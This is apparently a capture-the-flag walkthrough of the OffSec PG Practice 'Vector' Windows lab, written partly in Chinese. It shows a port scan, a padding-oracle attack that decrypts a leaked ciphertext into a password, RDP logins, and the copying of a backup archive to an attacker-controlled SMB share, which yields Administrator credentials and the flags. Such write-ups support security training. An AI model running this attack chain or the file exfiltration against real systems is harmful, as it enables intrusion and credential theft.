###### tags: `Offsec` `PG Practice` `Hard` `Windows`

# Vector
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.172.119 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.172.119:21
Open 192.168.172.119:80
Open 192.168.172.119:135
Open 192.168.172.119:139
Open 192.168.172.119:445
Open 192.168.172.119:2290
Open 192.168.172.119:3389
Open 192.168.172.119:5985

PORT     STATE SERVICE       REASON  VERSION
21/tcp   open  ftp           syn-ack Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
2290/tcp open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

查看`http://192.168.172.119:2290`可以看到
```
ERROR: missing parameter "c"
```
前往`http://192.168.172.119:2290/?c=`可看到
```
0
```

F12查看
```
<span id="MyLabel">0</span>
<!--
		AES-256-CBC-PKCS7 ciphertext: 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488
		
		Victor's TODO: Need to add authentication eventually..
-->	
```

google`AES-256-CBC-PKCS7 ciphertext`，可以找到[Padding Oracle Attack](https://github.com/mpgn/Padding-oracle-attack)，用他
```
┌──(kali㉿kali)-[~/pgplay/Padding-oracle-attack]
└─$ python3 exploit.py -c 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488 -l 16 --host 192.168.172.119:2290 -u /?c= -v --error '<span id="MyLabel">0</span>'

...
[+] Found 15 bytes : 6f726d416c6f655661743704040404

[+] Test [Byte 087/256 - Block 1 ]: 0427D08A2019CA6648435B216EA2DCBD
[+] HTTP  200 OK
[+] Block M_Byte : 576f726d416c6f655661743704040404
[+] Block C_{i-1}: 4358B2F77165B5130E323F067AB6C8A9
[+] Block Padding: 10101010101010101010101010101010

[+] Found 16 bytes : 576f726d416c6f655661743704040404


[+] Decrypted value (HEX): 576F726D416C6F655661743704040404
[+] Decrypted value (ASCII): WormAloeVat7
```

得到一個密碼`WormAloeVat7`，嘗試`rdp`進去，在桌面得到lccal.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ xfreerdp /u:victor /p:WormAloeVat7 /cert-ignore /size:smart-size /v:192.168.172.119

C:\Users\victor\Desktop>type local.txt
79d8c8413d3039195a95a2b45b69b5bd
```

在`C:\Users\victor\Downloads`可以看到一個`backup.rar`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ impacket-smbserver -smb2support -user user -password user share .

PS C:\Users\victor\Desktop> net use \\192.168.45.245 user /u:user
The command completed successfully.

PS C:\Users\victor\Downloads> copy backup.rar //192.168.45.245/share/backup.rar
```

用`victor`的密碼可以解出來
```
┌──(kali㉿kali)-[~/pgplay]
└─$ unrar e backup.rar 

UNRAR 7.01 beta 1 freeware      Copyright (c) 1993-2024 Alexander Roshal

Enter password (will not be echoed) for backup.rar: WormAloeVat7


Extracting from backup.rar

Extracting  backup.txt                                                OK 
All OK
```

`base64 decode`得到密碼
```
┌──(kali㉿kali)-[~/pgplay]
└─$ base64 -d backup.txt                    
Administrator:EverywayLabelWrap375
```

Administrator登入，在`C:\Users\Administrator\Desktop`得proof.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ xfreerdp /u:administrator /p:EverywayLabelWrap375 /cert-ignore /size:smart-size /v:192.168.172.119

C:\Users\Administrator\Desktop>type proof.txt
92b7e77313f70054c89ab98cae43e283
```